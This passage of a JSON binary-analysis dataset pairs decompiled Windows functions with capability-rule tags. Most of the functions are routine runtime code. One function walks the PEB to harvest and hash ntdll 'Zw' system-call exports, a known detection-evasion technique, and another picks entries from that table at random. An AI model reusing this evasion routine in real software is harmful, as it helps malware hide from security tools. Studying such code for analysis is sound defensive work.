        "decompiled_code": "\nvoid __fastcall fcn.0040d990(int32_t param_1)\n\n{\n    code **ppcVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    code **arg_8h;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = param_1 + 4;\n    if (*(param_1 + 4) != 0) {\n        if (*(param_1 + 0xc) != 0) {\n            if (param_1 == 0) {\n                iVar4 = 0;\n            }\n            if (iVar4 == 0) {\n                fcn.0040eda0(0xc0000005, 1);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n            arg_8h = *(iVar4 + 8);\n            while (arg_8h != NULL) {\n                (**arg_8h)(arg_8h[1]);\n                ppcVar1 = arg_8h[2];\n                fcn.0042fafa(arg_8h);\n                arg_8h = ppcVar1;\n            }\n            *(iVar4 + 8) = 0;\n            *(param_1 + 0xc) = 0;\n        }\n        piVar2 = *(param_1 + 0x28);\n        if (piVar2 != NULL) {\n            (**(*piVar2 + 8))(piVar2);\n        }\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 0x10);\n        *(param_1 + 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "0040da20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040da20(int32_t param_1)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    code **arg_8h;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    uint var_4h;\n    \n    piVar4 = *(param_1 + 0x2c);\n    if (piVar4 != NULL) {\n        iVar3 = *piVar4;\n        while (iVar3 != 0) {\n            piVar5 = piVar4[4];\n            if (piVar5 != NULL) {\n                (**(*piVar5 + 8))(piVar5);\n            }\n            piVar4[4] = 0;\n            (*piVar4[8])(0);\n            piVar4 = piVar4 + 9;\n            iVar3 = *piVar4;\n        }\n    }\n    piVar4 = *0x6c9c40;\n    piVar5 = *0x6c9c3c;\n    if (*0x6c9c3c < *0x6c9c40) {\n        do {\n            if (*piVar5 != 0) {\n                (**(*piVar5 + 0x1c))(0);\n                piVar4 = *0x6c9c40;\n            }\n            piVar5 = piVar5 + 1;\n        } while (piVar5 < piVar4);\n    }\n    iVar3 = param_1 + 4;\n    if (*(param_1 + 4) != 0) {\n        if (*(param_1 + 0xc) != 0) {\n            if (param_1 == 0) {\n                iVar3 = 0;\n            }\n            if (iVar3 == 0) {\n                fcn.0040eda0(0xc0000005, 1);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            arg_8h = *(iVar3 + 8);\n            while (arg_8h != NULL) {\n                (**arg_8h)(arg_8h[1]);\n                ppcVar1 = arg_8h[2];\n                fcn.0042fafa(arg_8h);\n                arg_8h = ppcVar1;\n            }\n            *(iVar3 + 8) = 0;\n            *(param_1 + 0xc) = 0;\n        }\n        piVar4 = *(param_1 + 0x28);\n        if (piVar4 != NULL) {\n            (**(*piVar4 + 8))(piVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 0x10);\n        *(param_1 + 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 622
    },
    "0040db10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040db10(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t in_ECX;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint var_4h;\n    \n    puVar2 = *(in_ECX + 0x10);\n    puVar3 = *(in_ECX + 0xc);\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    uVar1 = *puVar3;\n    if (uVar1 == 0xffff) {\n        return 1;\n    }\n    while (arg_8h != uVar1) {\n        uVar1 = puVar3[2];\n        puVar3 = puVar3 + 2;\n        puVar2 = puVar2 + 4;\n        if (uVar1 == 0xffff) {\n            return 1;\n        }\n    }\n    if (arg_ch == 0) {\n        if ((*puVar2 & 0x600) == 0) goto code_r0x0040dbe4;\n        uVar1 = (puVar3[1] | *puVar2) & 63999;\n    }\n    else if (arg_ch == 1) {\n        if ((*puVar2 & 0x200) != 0) goto code_r0x0040dbe4;\n        uVar1 = (puVar3[1] | *puVar2) & 0xfbff | 0x200;\n    }\n    else {\n        if ((arg_ch != 2) || ((*puVar2 & 0x400) != 0)) goto code_r0x0040dbe4;\n        uVar1 = (puVar3[1] | *puVar2) & 0xfdff | 0x400;\n    }\n    *puVar2 = uVar1;\ncode_r0x0040dbe4:\n    if (arg_10h != 0) {\n        *puVar2 = *puVar2 | puVar3[1];\n    }\n    if ((*puVar2 & puVar3[1]) != 0) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) | puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 522
    },
    "0040dc10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040dc10(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uchar auVar3 [16];\n    uint32_t uVar4;\n    int32_t in_ECX;\n    uint arg_8h_00;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    _lpRect = ZEXT816(0);\n    arg_8h_00 = *(in_ECX + 4);\n    (*_sym.imp.USER32.dll_GetClientRect)(arg_8h_00, &lpRect);\n    pcVar2 = _sym.imp.USER32.dll_SetWindowPos;\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongW;\n    if (*(in_ECX + 0x58) != -1) {\n        _lpRect = CONCAT44(var_10h + *(in_ECX + 0x60), lpRect + *(in_ECX + 0x58));\n        _lpRect = CONCAT48(var_ch - *(in_ECX + 0x5c), _lpRect);\n        _lpRect = CONCAT412(var_8h - *(in_ECX + 100), _lpRect);\n    }\n    if (*(in_ECX + 0x24) != 0) {\n        uVar4 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(in_ECX + 0x24), 0xfffffff0);\n        if ((uVar4 & 0x10000000) != 0) {\n            _var_24h = ZEXT816(0);\n            (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x24), &var_24h);\n            if (arg_8h != 0) {\n                (*pcVar2)(*(in_ECX + 0x24), 0, lpRect, var_10h, var_ch - lpRect, var_18h - var_20h, 0x14);\n                (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x24), 0, 0);\n            }\n            _lpRect = CONCAT44(var_10h + (var_18h - var_20h), lpRect);\n        }\n    }\n    if (*(in_ECX + 0x28) != 0) {\n        uVar4 = (*pcVar1)(*(in_ECX + 0x28), 0xfffffff0);\n        if ((uVar4 & 0x10000000) != 0) {\n            _var_24h = ZEXT816(0);\n            (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x28), &var_24h);\n            auVar3 = _lpRect;\n            var_8h = var_8h + (var_20h - var_18h);\n            if (arg_8h != 0) {\n                var_ch = SUB164(auVar3, 8);\n                lpRect = SUB164(auVar3, 0);\n                (*pcVar2)(*(in_ECX + 0x28), 0, lpRect, var_8h, var_ch - lpRect, var_18h - var_20h, 0x14);\n            }\n        }\n    }\n    if (*(in_ECX + 0x2c) != 0) {\n        (*pcVar2)(*(in_ECX + 0x2c), 0, lpRect, var_10h, var_ch - lpRect, var_8h - var_10h, 0x14);\n    }\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 4), 0, 0);\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 918
    },
    "0040ee40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ee40(uint lpBitmapName, uint arg_ch, uint wFlags, uint lpColorMap, uint iNumMaps)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    int32_t in_ECX;\n    uint32_t uVar8;\n    int16_t *arg_8h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *0x6cc7e4;\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceW)(*0x6cc7e4, lpBitmapName, 0xf1);\n    if (((iVar2 == 0) || (iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar4, iVar2),  iVar2 == 0)) ||\n       (iVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2),  iVar2 == 0)) {\n        return 0;\n    }\n    arg_8h = iVar2 + 8;\n    uVar8 = *(iVar2 + 6);\n    fcn.0040d540(*(iVar2 + 2), *(iVar2 + 4));\n    uVar4 = *0x6cc7e4;\n    iVar5 = *(in_ECX + 0x48);\n    if (iVar5 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(*0x6cc7e4, lpBitmapName, 2);\n        uVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar4, uVar3);\n        iVar5 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar4);\n        uVar7 = (*(iVar5 + 0xe) != 0x20) - 1U & 0x20;\n        *(in_ECX + 0x85) = uVar7 | *(in_ECX + 0x85) & 0xdf;\n        iVar5 = (*_sym.imp.COMCTL32.dll_ImageList_Create)\n                          (*(in_ECX + 0x90), *(in_ECX + 0x94), (uVar7 != 0) * '\\b' + '\\x19', *(iVar2 + 6), 1);\n        *(in_ECX + 0x48) = iVar5;\n        if (iVar5 == 0) {\n            return 0;\n        }\n    }\n    iVar2 = (*_sym.imp.COMCTL32.dll_ImageList_GetImageCount)(iVar5);\n    if (arg_ch == '\\0') {\n        if ((*(in_ECX + 0x85) & 0x20) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_LoadBitmapW)(*0x6cc7e4, lpBitmapName);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_LoadImageW)(*0x6cc7e4, lpBitmapName, 0, 0, 0, 0x2040);\n        }\n    }\n    else {\n        iVar5 = (*_sym.imp.COMCTL32.dll_CreateMappedBitmap)(*0x6cc7e4, lpBitmapName, wFlags, lpColorMap, iNumMaps);\n    }\n    if (iVar5 != 0) {\n        iVar6 = (*_sym.imp.COMCTL32.dll_ImageList_AddMasked)(*(in_ECX + 0x48), iVar5, *(in_ECX + 0xa0));\n        if (iVar6 != -1) {\n            for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n                if (*arg_8h != 0) {\n                    fcn.00402180(arg_8h);\n                }\n                arg_8h = arg_8h + 1;\n            }\n            iVar6 = (*_sym.imp.COMCTL32.dll_ImageList_GetImageCount)(*(in_ECX + 0x48));\n            if (iVar6 == *(in_ECX + 0x50)) {\n                cVar1 = fcn.004066f0(6, 0, 0);\n                if (cVar1 != '\\0') {\n                    fcn.0040eb80(iVar2, iVar6 - iVar2);\n                }\n                (*_sym.imp.GDI32.dll_DeleteObject)(iVar5);\n                return 1;\n            }\n        }\n        (*_sym.imp.GDI32.dll_DeleteObject)(iVar5);\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1014
    },
    "0042e850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e850(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    \n    iVar2 = 0;\n    cVar3 = '\\0';\n    if (arg_8h == 0) {\n        cVar3 = -0x18;\n    }\n    else {\n        if (arg_8h != 1) goto code_r0x0042e876;\n        cVar3 = -0x46;\n    }\n    iVar2 = 5;\ncode_r0x0042e876:\n    arg_8h_00 = fcn.00456519(0);\n    fcn.00456199(arg_8h_00);\n    do {\n        uVar1 = fcn.00456178();\n    } while (*(*((uVar1 % (*0x6c9e30 + 1U)) * 8 + 0x6c9e38) + *0x6cc7d8 + iVar2) != cVar3);\n    return;\n}\n",
        "token_count": 246
    },
    "0042e8f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042e8f0(uint16_t *arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0xa1143980;\n    cVar1 = *arg_8h;\n    while (cVar1 != '\\0') {\n        uVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        uVar3 = uVar3 ^ (uVar3 >> 8 | uVar3 << 0x18) + uVar2;\n        cVar1 = *arg_8h;\n    }\n    return uVar3;\n}\n",
        "token_count": 158
    },
    "0042e920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0042e920(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint16_t *puVar9;\n    uint16_t *puVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*0x6c9e30 != 0) {\n        return 1;\n    }\n    iVar11 = 0;\n    piVar7 = *(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc);\n    iVar2 = piVar7[6];\n    if (piVar7[6] != 0) {\n        do {\n            iVar6 = iVar2;\n            iVar2 = *(*(iVar6 + 0x3c) + 0x78 + iVar6);\n            if (iVar2 != 0) {\n                iVar12 = *(iVar2 + 0xc + iVar6);\n                iVar11 = iVar2 + iVar6;\n                if (((*(iVar12 + iVar6) | 0x20202020) == 0x6c64746e) &&\n                   ((*(iVar12 + 4 + iVar6) | 0x20202020) == 0x6c642e6c)) break;\n            }\n            piVar7 = *piVar7;\n            iVar2 = piVar7[6];\n        } while (piVar7[6] != 0);\n        if (iVar11 != 0) {\n            iVar2 = *(iVar11 + 0x1c);\n            var_4h = *(iVar11 + 0x18);\n            iVar12 = 0;\n            puVar9 = *(iVar11 + 0x24) + iVar6 + var_4h * 2;\n            piVar7 = *(iVar11 + 0x20) + -4 + iVar6 + var_4h * 4;\n            *0x6cc7d8 = iVar6;\n            do {\n                puVar9 = puVar9 + -1;\n                puVar10 = *piVar7 + iVar6;\n                if (*puVar10 == 0x775a) {\n                    uVar13 = 0xa1143980;\n                    do {\n                        uVar1 = *puVar10;\n                        puVar10 = puVar10 + 1;\n                        uVar13 = uVar13 ^ (uVar13 >> 8 | uVar13 << 0x18) + uVar1;\n                    } while (*puVar10 != '\\0');\n                    *(iVar12 * 8 + 0x6c9e34) = uVar13;\n                    *(iVar12 * 8 + 0x6c9e38) = *(iVar2 + iVar6 + *puVar9 * 4);\n                    iVar12 = iVar12 + 1;\n                    if (iVar12 == 500) break;\n                }\n                var_4h = var_4h + -1;\n                piVar7 = piVar7 + -1;\n            } while (var_4h != 0);\n            uVar13 = 0;\n            *0x6c9e30 = iVar12;\n            if (iVar12 == 1) {\n                return 1;\n            }\n            do {\n                uVar8 = 0;\n                if (iVar12 - uVar13 != 1) {\n                    do {\n                        uVar3 = *(uVar8 * 8 + 0x6c9e38);\n                        uVar4 = *(uVar8 * 8 + 0x6c9e40);\n                        if (uVar4 < uVar3) {\n                            uVar5 = *(uVar8 * 8 + 0x6c9e34);\n                            *(uVar8 * 8 + 0x6c9e34) = *(uVar8 * 8 + 0x6c9e3c);\n                            *(uVar8 * 8 + 0x6c9e38) = uVar4;\n                            *(uVar8 * 8 + 0x6c9e3c) = uVar5;\n                            *(uVar8 * 8 + 0x6c9e40) = uVar3;\n                            iVar12 = *0x6c9e30;\n                        }\n                        uVar8 = uVar8 + 1;\n                    } while (uVar8 < (iVar12 - uVar13) - 1);\n                }\n                uVar13 = uVar13 + 1;\n            } while (uVar13 < iVar12 - 1U);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1089
    },
    "0042ee87": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ee87(uint arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = arg_8h;\n    *(in_ECX + 1) = 0;\n    if (arg_ch != '\\0') {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg_8h);\n        *(in_ECX + 1) = 1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0042f1f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f1f2(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint *puVar1;\n    uint arg_8h_00;\n    \n    if (arg_14h == 0) {\ncode_r0x0042f237:\n        arg_8h_00 = 0;\n    }\n    else {\n        if ((arg_8h == 0) || (arg_10h == 0)) {\n            puVar1 = fcn.0043bcb5();\n            arg_8h_00 = 0x16;\n        }\n        else {\n            if (arg_14h <= arg_ch) {\n                fcn.00431830(arg_8h, arg_10h, arg_14h);\n                goto code_r0x0042f237;\n            }\n            puVar1 = fcn.0043bcb5();\n            arg_8h_00 = 0x22;\n        }\n        *puVar1 = arg_8h_00;\n        fcn.0043bb3e();\n    }\n    fcn.00402c90(arg_8h_00);\n    return;\n}\n",
        "token_count": 272
    },
    "0042f2a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f2a3(uint *Ptr)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t hModule;\n    uint var_4h;\n    \n    if (*0x6cc828 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    hModule = (*_sym.imp.KERNEL32.dll_LoadLibraryExA)(\"atlthunk.dll\", 0, 0x800);\n    if ((((hModule != 0) && (cVar1 = fcn.0042f566(hModule, \"AtlThunk_AllocateData\", 0x6cc818),  cVar1 != '\\0')) &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_InitData\", 0x6cc81c),  cVar1 != '\\0')) &&\n       ((cVar1 = fcn.0042f566(hModule, \"AtlThunk_DataToCode\", 0x6cc820),  cVar1 != '\\0' &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_FreeData\", 0x6cc824),  cVar1 != '\\0')))) {\n        LOCK();\n        *0x6cc828 = 1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "0042f353": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f353(uint *Ptr)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t hModule;\n    uint var_4h;\n    \n    if (*0x6cc828 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    hModule = (*_sym.imp.KERNEL32.dll_LoadLibraryExA)(\"atlthunk.dll\", 0, 0x800);\n    if ((((hModule != 0) && (cVar1 = fcn.0042f566(hModule, \"AtlThunk_AllocateData\", 0x6cc818),  cVar1 != '\\0')) &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_InitData\", 0x6cc81c),  cVar1 != '\\0')) &&\n       ((cVar1 = fcn.0042f566(hModule, \"AtlThunk_DataToCode\", 0x6cc820),  cVar1 != '\\0' &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_FreeData\", 0x6cc824),  cVar1 != '\\0')))) {\n        LOCK();\n        *0x6cc828 = 1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 325
    },
    "0042f403": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f403(uint *Ptr)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t hModule;\n    uint var_4h;\n    \n    if (*0x6cc828 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    hModule = (*_sym.imp.KERNEL32.dll_LoadLibraryExA)(\"atlthunk.dll\", 0, 0x800);\n    if ((((hModule != 0) && (cVar1 = fcn.0042f566(hModule, \"AtlThunk_AllocateData\", 0x6cc818),  cVar1 != '\\0')) &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_InitData\", 0x6cc81c),  cVar1 != '\\0')) &&\n       ((cVar1 = fcn.0042f566(hModule, \"AtlThunk_DataToCode\", 0x6cc820),  cVar1 != '\\0' &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_FreeData\", 0x6cc824),  cVar1 != '\\0')))) {\n        LOCK();\n        *0x6cc828 = 1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 325
    },
    "0042f4b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042f4b3(uint *Ptr)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t hModule;\n    uint var_4h;\n    \n    if (*0x6cc828 != '\\0') {\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    hModule = (*_sym.imp.KERNEL32.dll_LoadLibraryExA)(\"atlthunk.dll\", 0, 0x800);\n    if ((((hModule != 0) && (cVar1 = fcn.0042f566(hModule, \"AtlThunk_AllocateData\", 0x6cc818),  cVar1 != '\\0')) &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_InitData\", 0x6cc81c),  cVar1 != '\\0')) &&\n       ((cVar1 = fcn.0042f566(hModule, \"AtlThunk_DataToCode\", 0x6cc820),  cVar1 != '\\0' &&\n        (cVar1 = fcn.0042f566(hModule, \"AtlThunk_FreeData\", 0x6cc824),  cVar1 != '\\0')))) {\n        LOCK();\n        *0x6cc828 = 1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*Ptr);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 327
    },
    "0042f5cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0042f5cc(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if ((*0x6cc814 != 0) || (iVar1 = fcn.0042f6e2(),  iVar1 != 0)) {\n        if (*0x6cc814 == 1) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n            uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n        }\n        else {\n            uVar3 = (*_sym.imp.KERNEL32.dll_InterlockedPopEntrySList)(*0x6cc814);\n            if (uVar3 != 0) {\n                fcn.00431db0(uVar3, 0, 0xd);\n                return uVar3;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x1000, 0x1000, 0x40);\n            if (uVar3 != 0) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_InterlockedPopEntrySList)(*0x6cc814);\n                if (uVar4 != 0) {\n                    (*_sym.imp.KERNEL32.dll_VirtualFree)(uVar3, 0, 0x8000);\n                    return uVar4;\n                }\n                uVar4 = uVar3 + 0xff0;\n                do {\n                    (*_sym.imp.KERNEL32.dll_InterlockedPushEntrySList)(*0x6cc814, uVar3);\n                    uVar3 = uVar3 + 0x10;\n                } while (uVar3 < uVar4);\n                return uVar3;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0xc0000017, 0, 0, 0);\n    return 0;\n}\n",
        "token_count": 458
    },
    "0042f6b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f6b2(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (arg_8h != 0) {\n        if (*0x6cc814 == 1) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return;\n        }\n        (*_sym.imp.KERNEL32.dll_InterlockedPushEntrySList)(*0x6cc814, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0042f7fa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f7fa(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    if (arg_8h != NULL) {\n        if (arg_8h[1] != 0) {\n            if (*arg_8h == 0) {\n                pcVar1 = fcn.0042f403(0x6cc824);\n                if (pcVar1 != NULL) {\n                    (**0x47b3f8)(arg_8h[1]);\n                    (*pcVar1)();\n                }\n            }\n            else {\n                fcn.0042f6b2(arg_8h[1]);\n            }\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0042f850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042f850(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    \n    if ((arg_8h != NULL) && (arg_8h[1] != 0)) {\n        if (*arg_8h == 0) {\n            pcVar1 = fcn.0042f4b3(0x6cc81c);\n            if (pcVar1 != NULL) {\n                (**0x47b3f8)(arg_8h[1], arg_ch, arg_10h);\n                (*pcVar1)();\n            }\n        }\n        else {\n            fcn.0042f58d(arg_ch, arg_10h);\n        }\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "00430730": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
